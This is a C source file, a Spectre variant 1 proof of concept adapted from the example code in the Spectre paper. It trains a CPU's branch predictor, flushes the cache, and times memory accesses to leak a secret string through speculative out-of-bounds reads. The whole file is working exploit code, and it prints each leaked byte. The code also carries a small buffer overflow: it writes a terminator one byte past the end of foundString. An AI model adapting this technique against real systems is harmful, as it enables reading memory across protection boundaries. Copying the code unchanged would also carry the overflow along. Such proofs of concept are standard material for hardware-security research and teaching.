/*********************************************************************
*
* Spectre PoC
*
* This source code originates from the example code provided in the 
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Minor modifications have been made to fix compilation errors and
* improve documentation where possible.
*
**********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#include <sched.h>
#include <string.h>
#include "memory_function.h"
#include "helper_functions.h"

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {
        1,
        2,
        3,
        4,
        5,
        6,
        7,
        8,
        9,
        10,
        11,
        12,
        13,
        14,
        15,
        16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}


/********************************************************************
Analysis code
********************************************************************/

static inline void callVictimCodeWithFlushedCache(size_t address) {
    flush(&array1_size);
    wait();
    victim_function(address);
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int valueScore[2], int num_tries) {
    static int results[256];
    static int time;
    static int i;

    for (i = 0; i < 256; i++) results[i] = 0;

    while (num_tries-- > 0) {
        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++) flush(&array2[i * 512]);
        wait();

        /* Training the Branch Prediction of the victim code */
        for (i = 10; i >= 0; i--)
            callVictimCodeWithFlushedCache(num_tries % array1_size);
        wait();

        /* Calling victim code so it loads data to cache */
        callVictimCodeWithFlushedCache(malicious_x);

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255;
            time = (int) memaccesstime(&array2[mix_i * 512]);
            if (time <= cache_hit_threshold && mix_i != array1[num_tries % array1_size])
                results[mix_i]++;
        }
    }

    int min_index = 0;
    for (i = 0; i < 256; i++) {
        if (results[i] >= results[min_index]) {
            min_index = i;
        }
    }
    valueScore[0] = min_index;
    valueScore[1] = results[min_index];
}

int main() {
    int num_tries = 1000;
    int cacheHitThreshold = getCacheHitThresholdTime(10000);

    size_t malicious_x = (size_t) (secret - (char *) array1);
    char foundString[strlen(secret)];
    int valueScore[2];

    /* write to array2 so in RAM not copy-on-write zero pages */
    for (int i = 0; i < (int) sizeof(array2); i++) array2[i] = 1;

    /* Print cache hit threshold */
    printf("Using a cache hit threshold of %d.\n", cacheHitThreshold);
    printf("Reading %d bytes:\n", (int) sizeof(foundString));

    /* Start the read loop to read each address */
    for (int i = 0; i < (int) sizeof(foundString); i++) {
        readMemoryByte(cacheHitThreshold, malicious_x, valueScore, num_tries);
        foundString[i] = (char) valueScore[0];
        foundString[i + 1] = '\0';

        /* Display the results */
        printf("Speculatively accessed virtual address %p ", (void *) malicious_x);
        printf("Got secret: %03d = '%c' ", foundString[i], foundString[i]);
        printf("Success Rate: %04d/%d", valueScore[1], num_tries);
        printf("\n");

        malicious_x++;
    }
    printf("Secret: %s\n", secret);
    printf("Found : %s", foundString);
    return 0;
}
